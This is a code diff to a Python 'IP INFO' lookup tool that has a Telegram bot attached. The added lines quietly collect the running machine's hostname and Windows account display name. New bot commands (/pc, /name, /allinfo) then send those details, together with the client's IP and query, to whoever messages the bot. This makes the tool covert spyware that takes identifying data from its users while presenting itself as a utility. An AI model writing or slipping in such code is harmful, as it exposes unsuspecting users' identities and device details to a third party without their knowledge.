@@ -6,6 +6,10 @@ import time
 from tkinter import messagebox
 import sqlite3
 from datetime import datetime
+import socket
+import ctypes
+
+n = socket.gethostname()
 
 s = requests.get('https://2ip.ua/ru/')
 
@@ -73,6 +77,19 @@ def get_info_by_ip(ip='127.0.0.1'):
     except requests.exceptions.ConnectionError:
         print('[!] Please check your connection!')
 
+def get_display_name():
+    GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
+    NameDisplay = 3
+
+    size = ctypes.pointer(ctypes.c_ulong(0))
+    GetUserNameEx(NameDisplay, None, size)
+
+    nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
+    GetUserNameEx(NameDisplay, nameBuffer, size)
+    return nameBuffer.value
+
+un = get_display_name()
+
 def main():
     preview_text = Figlet(font='slant')
     print(preview_text.renderText('IP INFO'))
@@ -99,6 +116,21 @@ def main():
             elif get_message_text(upd).lower() == "/help":
                 send_message(get_chat_id(upd),
                              "Я Бот для отримання IP адресів клієнтів")
+            elif get_message_text(upd).lower() == "/pc":
+                send_message(get_chat_id(upd),
+                             f"Ім'я пристрою клієнта: {n}")
+            elif get_message_text(upd).lower() == "/name":
+                send_message(get_chat_id(upd),
+                             f"Ім'я облікового запису клієнта: {un}")
+            elif get_message_text(upd).lower() == "/allinfo":
+                send_message(get_chat_id(upd),
+                             f"IP клієнта: {a}")
+                send_message(get_chat_id(upd),
+                             f"Запит клієнта: {ip}")
+                send_message(get_chat_id(upd),
+                             f"Ім'я пристрою клієнта: {n}")
+                send_message(get_chat_id(upd),
+                             f"Ім'я облікового запису клієнта: {un}")
             else:
                 send_message(get_chat_id(upd), "Я не знаю що мені робить :(")
             up_id += 1
